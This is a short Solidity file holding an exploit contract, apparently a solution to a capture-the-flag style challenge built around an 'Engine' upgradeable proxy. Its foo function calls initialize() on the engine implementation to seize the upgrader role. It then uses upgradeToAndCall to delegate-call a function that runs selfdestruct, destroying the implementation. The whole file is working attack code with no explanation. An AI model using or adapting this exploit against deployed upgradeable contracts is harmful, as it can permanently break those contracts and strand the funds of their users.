// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MyContract {
    // 0x38C775a2D4A1354751c40D02b448E8c482b2AD29

    // 0xd19665d880d67b3ed6df96842c6e0ec315565a81

    event Log(bool result, bytes data);


    // function foo(IEngine _engine, address _target) public {
    //     _engine.initialize();
    //     bytes memory delegateData = abi.encodeWithSignature("fooFoo()");
    //     bytes memory data = abi.encodeWithSignature("upgradeToAndCall()", address(this), delegateData);
    //     (bool result,  bytes memory d) = _target.call(data);
    //     emit Log(result, d);
    // }

    function foo(IEngine _engine) public {
        _engine.initialize();
        bytes memory delegateData = abi.encodeWithSignature("fooFoo()");
        _engine.upgradeToAndCall(address(this), delegateData);
    }

    function fooFoo() public {
        selfdestruct(payable(msg.sender));
    }

    

}



interface IEngine {
    function upgrader() external view returns(address);
    function horsePower() external view returns(uint);
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}